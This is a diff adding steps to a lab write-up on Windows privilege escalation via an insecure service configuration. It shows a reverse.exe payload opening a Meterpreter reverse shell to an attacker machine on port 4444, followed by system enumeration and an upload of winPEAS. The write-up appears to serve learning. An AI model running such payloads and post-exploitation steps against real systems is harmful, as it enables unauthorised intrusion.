@@ -179,3 +179,74 @@ CertUtil: -URLCache command completed successfully.
 <p align="center">
   <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step4-1.png" width="600">
 </p>
+
+## Step 5 — Running the Payload and Getting a Meterpreter Shell
+
+On the Victim Machine
+
+```bash
+C:\PrivEsc> reverse.exe
+```
+Metasploit Caught the Connection on Kali
+
+```text
+[*] Sending stage (244806 bytes) to 192.168.5.129
+[*] Meterpreter session 1 opened (192.168.5.128:4444 -> 192.168.5.129:49985) at 2026-06-18 00:01:24 -0400
+
+meterpreter >
+```
+- Attacker IP : 192.168.5.128
+- Victim IP : 192.168.5.129
+- Port : 4444
+- Session : Meterpreter session 1 opened
+
+<p align="center">
+  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step5-1.png" width="600">
+</p>
+
+## Step 6 — Enumerating the Victim and Uploading winPEAS
+
+Checked System Info and Current User
+
+```bash
+meterpreter > sysinfo
+```
+
+**Output:**
+
+```text
+Computer        : MSEDGEWIN10
+OS              : Windows 10 1809 (10.0 Build 17763).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x64/windows
+```
+
+```bash
+meterpreter > getuid
+```
+```text
+Server username: MSEDGEWIN10\user
+```
+I was a normal low privilege user. I needed to get to SYSTEM.
+
+<p align="center">
+  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step6-1.png" width="600">
+</p>
+
+Uploaded winPEAS
+
+```bash
+meterpreter > upload /home/kali/Desktop/tools/winPEASany.exe
+```
+
+```text
+[*] Uploading  : /home/kali/Desktop/tools/winPEASany.exe -> winPEASany.exe
+[*] Uploaded 224.00 KiB of 224.00 KiB (100.0%): /home/kali/Desktop/tools/winPEASany.exe -> winPEASany.exe
+[*] Completed  : /home/kali/Desktop/tools/winPEASany.exe -> winPEASany.exe
+```
+<p align="center">
+  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step6-2.png" width="600">
+</p>
